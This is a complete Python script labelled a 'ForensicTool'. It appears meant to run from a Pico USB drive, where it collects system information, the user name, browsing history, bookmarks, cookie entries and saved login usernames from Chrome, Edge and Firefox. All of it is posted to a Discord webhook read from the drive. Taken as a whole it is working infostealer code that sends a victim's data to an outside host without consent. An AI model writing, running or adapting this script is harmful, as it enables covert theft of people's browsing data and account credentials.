import os
import shutil
import sqlite3
import json
import time
import platform
import getpass
import psutil
import requests

PICO_DRIVE = "D:/"
WEBHOOK_PATH = os.path.join(PICO_DRIVE, "webhook.txt")

def get_webhook():
    if not os.path.exists(WEBHOOK_PATH):
        print("[ERROR] webhook.txt not found on Pico")
        return None
    with open(WEBHOOK_PATH, "r") as f:
        return f.read().strip()

def send_to_discord(webhook, title, content):
    payload = {
        "username": "ForensicTool",
        "embeds": [{
            "title": title,
            "description": content[:4096]
        }]
    }
    try:
        res = requests.post(webhook, json=payload)
        print(f"[INFO] Sent '{title}' → status {res.status_code}")
    except Exception as e:
        print(f"[ERROR] Failed to send {title}: {e}")

def collect_system_info():
    info = {
        "OS": platform.system(),
        "Version": platform.version(),
        "Platform": platform.platform(),
        "Machine": platform.machine(),
        "Processor": platform.processor(),
        "RAM(GB)": round(psutil.virtual_memory().total / (1024 ** 3), 2),
        "User": getpass.getuser()
    }
    return "\n".join(f"**{k}:** {v}" for k, v in info.items())

def copy_sqlite(src_path):
    tmp = src_path + ".tmp"
    try:
        if os.path.exists(tmp):
            os.remove(tmp)
        shutil.copy2(src_path, tmp)
        return tmp
    except:
        return None

def extract_sqlite(path, query, mapping=lambda row: row):
    tmp = copy_sqlite(path)
    if not tmp:
        return []
    try:
        conn = sqlite3.connect(tmp)
        cur = conn.cursor()
        cur.execute(query)
        results = [mapping(row) for row in cur.fetchall()]
    except:
        results = []
    finally:
        conn.close()
        os.remove(tmp)
    return results

def browser_paths():
    home = os.path.expanduser("~")
    return {
        "Chrome": {
            "history": home + r"\AppData\Local\Google\Chrome\User Data\Default\History",
            "bookmarks": home + r"\AppData\Local\Google\Chrome\User Data\Default\Bookmarks",
            "cookies": home + r"\AppData\Local\Google\Chrome\User Data\Default\Cookies",
            "logins": home + r"\AppData\Local\Google\Chrome\User Data\Default\Login Data"
        },
        "Edge": {
            "history": home + r"\AppData\Local\Microsoft\Edge\User Data\Default\History",
            "bookmarks": home + r"\AppData\Local\Microsoft\Edge\User Data\Default\Bookmarks",
            "cookies": home + r"\AppData\Local\Microsoft\Edge\User Data\Default\Cookies",
            "logins": home + r"\AppData\Local\Microsoft\Edge\User Data\Default\Login Data"
        },
        "Firefox": {
            "profile_dirs": home + r"\AppData\Roaming\Mozilla\Firefox\Profiles"
        }
    }

def extract_chrome_based(name, paths):
    data = {}
    # History
    q = "SELECT url, title, datetime(last_visit_time/1000000-11644473600,'unixepoch') FROM urls ORDER BY last_visit_time DESC LIMIT 20"
    data['history'] = extract_sqlite(paths['history'], q, lambda r: f"{r[2]} — {r[1] or r[0]}")
    # Bookmarks
    try:
        with open(paths['bookmarks'], "r", encoding="utf-8") as f:
            bm = json.load(f)
        items = []
        def traverse(nodes):
            for node in nodes:
                if node.get("type") == "url":
                    items.append(f"{node['name']} — {node['url']}")
                elif "children" in node:
                    traverse(node["children"])
        traverse(bm["roots"].values())
        data['bookmarks'] = items[:20]
    except:
        data['bookmarks'] = []
    # Cookies
    q = "SELECT host_key, name, encrypted_value FROM cookies LIMIT 10"
    data['cookies'] = extract_sqlite(paths['cookies'], q, lambda r: f"{r[0]} | {r[1]}")
    # Logins
    q = "SELECT origin_url, username_value FROM logins LIMIT 10"
    data['logins'] = extract_sqlite(paths['logins'], q, lambda r: f"{r[0]} | {r[1]}")
    return data

def extract_firefox():
    data = {}
    profroot = browser_paths()['Firefox']['profile_dirs']
    if not os.path.exists(profroot):
        return data
    for prof in os.listdir(profroot):
        profdir = os.path.join(profroot, prof)
        if os.path.isdir(profdir):
            # History (places.sqlite)
            path = os.path.join(profdir, "places.sqlite")
            q = """SELECT url, title, datetime(last_visit_date/1000000,'unixepoch') 
                   FROM moz_places ORDER BY last_visit_date DESC LIMIT 20"""
            data['history'] = extract_sqlite(path, q, lambda r: f"{r[2]} — {r[1] or r[0]}")
            # Bookmarks (from same DB)
            q2 = """SELECT moz_bookmarks.title, moz_places.url 
                    FROM moz_bookmarks JOIN moz_places ON moz_bookmarks.fk = moz_places.id 
                    ORDER BY moz_bookmarks.dateAdded DESC LIMIT 20"""
            data['bookmarks'] = extract_sqlite(path, q2, lambda r: f"{r[0]} — {r[1]}")
            # Firefox cookies & logins need specialized parsing—omitted for now
            break
    return data

def main():
    webhook = get_webhook()
    if not webhook:
        return

    send_to_discord(webhook, "🖥 System Info", collect_system_info())

    paths = browser_paths()
    browsers = []
    browser_data = {}

    # Chrome & Edge
    for b in ("Chrome","Edge"):
        if os.path.exists(paths[b]['history']):
            browsers.append(b)
            browser_data[b] = extract_chrome_based(b, paths[b])

    # Firefox
    ff = extract_firefox()
    if 'history' in ff:
        browsers.append("Firefox")
        browser_data['Firefox'] = ff

    send_to_discord(webhook, "🌐 Browsers Detected", f"{len(browsers)}: {', '.join(browsers)}")

    # Send data per browser
    for b in browsers:
        data = browser_data[b]
        send_to_discord(webhook, f"📘 {b} History", "\n".join(data.get('history', ["No history"])))
        send_to_discord(webhook, f"🔖 {b} Bookmarks", "\n".join(data.get('bookmarks', ["No bookmarks"])))
        send_to_discord(webhook, f"🍪 {b} Cookies", "\n".join(data.get('cookies', ["No cookies"])))
        send_to_discord(webhook, f"🔑 {b} Logins", "\n".join(data.get('logins', ["No logins"])))

if __name__ == "__main__":
    main()
